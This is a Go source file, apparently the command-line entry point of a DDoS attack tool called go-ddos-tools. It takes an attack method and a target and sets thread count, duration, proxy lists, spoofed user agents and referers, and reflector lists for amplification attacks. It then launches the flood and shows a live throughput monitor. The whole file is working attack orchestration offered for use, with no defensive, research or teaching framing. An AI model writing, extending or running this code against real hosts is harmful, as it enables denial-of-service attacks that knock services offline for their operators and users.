package cmd

import (
	"context"
	"flag"
	"fmt"

	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/go-ddos-tools/pkg/attacks"
	"github.com/go-ddos-tools/pkg/config"
	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/execution"
	"github.com/go-ddos-tools/pkg/methods"
	"github.com/go-ddos-tools/pkg/proxy"
	"github.com/go-ddos-tools/pkg/tools"
	"github.com/go-ddos-tools/pkg/ui"
	"github.com/go-ddos-tools/pkg/utils"
)

func Execute() {
	defer func() {
		if r := recover(); r != nil {
			ui.PrintError("Unexpected error: %v", r)
		}
	}()

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	if len(os.Args) < 2 {
		ui.PrintBanner()
		ui.PrintUsage()
		return
	}

	command := strings.ToUpper(os.Args[1])

	switch command {
	case "HELP", "-H", "--HELP":
		ui.PrintBanner()
		ui.PrintUsage()
	case "TOOLS":
		ui.PrintBanner()

		tools.RunConsole()
	case "STOP":

		tools.StopAllAttacks()
	case "VERSION", "-V", "--VERSION":
		ui.PrintBanner()
	case "METHODS":
		ui.PrintBanner()
		printMethods()
	default:
		if err := runAttack(os.Args[1:], sigChan); err != nil {
			ui.PrintError("%v", err)
			fmt.Println()
			printUsageHint()
			os.Exit(1)
		}
	}
}

func runAttack(args []string, sigChan chan os.Signal) error {
	if len(args) < 2 {
		return fmt.Errorf("insufficient arguments. Expected: <method> <target> [options...]")
	}

	fs := flag.NewFlagSet(args[0], flag.ContinueOnError)
	threads := fs.Int("threads", 100, "Number of threads")
	duration := fs.Int("duration", 60, "Duration of the attack in seconds")
	rpc := fs.Int("rpc", 100, "Requests per connection")
	proxyType := fs.Int("proxy-type", 5, "SOCKS proxy type (4 or 5)")
	proxyFile := fs.String("proxy-file", "proxies.txt", "Proxy file name")
	configFile := fs.String("config", "config.json", "Configuration file")
	userAgentsFile := fs.String("user-agents", "files/useragent.txt", "User agents file")
	referersFile := fs.String("referers", "files/referers.txt", "Referers file")
	reflectorsFile := fs.String("reflectors", "", "Reflectors file for amplification attacks")

	if err := fs.Parse(args[2:]); err != nil {
		return err
	}

	method := strings.ToUpper(args[0])
	target := args[1]

	if !methods.IsValidMethod(method) {
		suggestions := ui.SuggestMethod(method, methods.AllMethods)
		errMsg := fmt.Sprintf("invalid method: %s", method)
		if len(suggestions) > 0 {
			errMsg += fmt.Sprintf("\n  Did you mean: %s?", strings.Join(suggestions, ", "))
		}
		return fmt.Errorf("%s", errMsg)
	}

	if result := ui.ValidateThreads(*threads); !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "Threads"))
	}
	if result := ui.ValidateDuration(*duration); !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "Duration"))
	}
	if methods.IsLayer7Method(method) {
		if result := ui.ValidateRPC(*rpc); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "RPC"))
		}
		if result := ui.ValidateProxyType(*proxyType); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "Proxy Type"))
		}
		if result := ui.ValidateURL(target); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "Target URL"))
		}
	} else {
		if result := ui.ValidateHostPort(target); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "Target Host/Port"))
		}
	}

	// Load configuration
	cfg, err := config.LoadConfig(*configFile)
	if err != nil {
		ui.PrintWarning("Could not load %s, using defaults: %v", *configFile, err)
		cfg = &config.Config{
			MCBot:             "MHDDoS_",
			MinecraftProtocol: 47,
		}
	}

	// Normalize target URL
	if methods.IsLayer7Method(method) && !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	var proxies []proxy.Proxy
	var userAgents, referers, reflectors []string

	if methods.IsLayer7Method(method) {
		userAgents, _ = utils.LoadRequiredFile(*userAgentsFile, "user agent")
		referers, _ = utils.LoadRequiredFile(*referersFile, "referer")

		if *proxyFile != "" {
			proxies, _ = proxy.LoadOrDownloadProxies("files/proxies/"+"*proxyFile", *proxyType, cfg, target, *threads)
		}
	} else if methods.IsLayer4Method(method) {
		if methods.IsAmplificationMethod(method) && *reflectorsFile != "" {
			reflectors, _ = utils.LoadLines("files/" + *reflectorsFile)
		}
	}

	attackCfg := &core.AttackConfig{
		Target:       target,
		Threads:      *threads,
		Duration:     *duration,
		RPC:          *rpc,
		Proxies:      proxies,
		UserAgents:   userAgents,
		Referers:     referers,
		Reflectors:   reflectors,
		ProtocolID:   cfg.MinecraftProtocol,
		RequestsSent: utils.NewCounter(),
		BytesSent:    utils.NewCounter(),
	}

	attacker := attacks.NewAttacker(method, attackCfg)
	if attacker == nil {
		return fmt.Errorf("unknown method implementation: %s", method)
	}

	// Start attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(*duration)*time.Second)
	defer cancel()

	// Handle signals to cancel context
	go func() {
		<-sigChan
		cancel()
	}()

	fmt.Println()
	ui.PrintInfo("Starting attack...")

	// Run attack in background
	go execution.RunAttack(ctx, attacker, *threads)

	// Monitor
	monitorAttack(ctx, *duration, method, target, attackCfg)

	return nil
}

func monitorAttack(ctx context.Context, duration int, method, target string, cfg *core.AttackConfig) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()

	for {
		select {
		case <-ctx.Done():
			fmt.Println()
			ui.PrintSuccess("Attack finished")
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			progress := (elapsed / float64(duration)) * 100
			if progress > 100 {
				progress = 100
			}

			reqs := cfg.RequestsSent.Get()
			bytes := cfg.BytesSent.Get()

			ui.ClearLine()
			fmt.Printf("  %s Target: %s | Method: %s | PPS: %s | BPS: %s %s",
				ui.Spinner(int(elapsed)),
				ui.FormatTarget(target),
				ui.FormatMethod(method),
				ui.FormatNumber(utils.HumanFormat(reqs)),
				ui.FormatNumber(utils.HumanBytes(bytes)),
				ui.ProgressBar(progress, 20))

			cfg.RequestsSent.Set(0)
			cfg.BytesSent.Set(0)
		}
	}
}

func printUsageHint() {
	fmt.Println("Run '" + os.Args[0] + " help' for usage.")
}

func printMethods() {
	l7 := []string{}
	l4 := []string{}
	amp := []string{}

	for _, m := range methods.AllMethods {
		if methods.IsLayer7Method(m) {
			l7 = append(l7, m)
		} else if methods.IsAmplificationMethod(m) {
			amp = append(amp, m)
		} else {
			l4 = append(l4, m)
		}
	}
	ui.PrintMethods(l7, l4, amp)
}
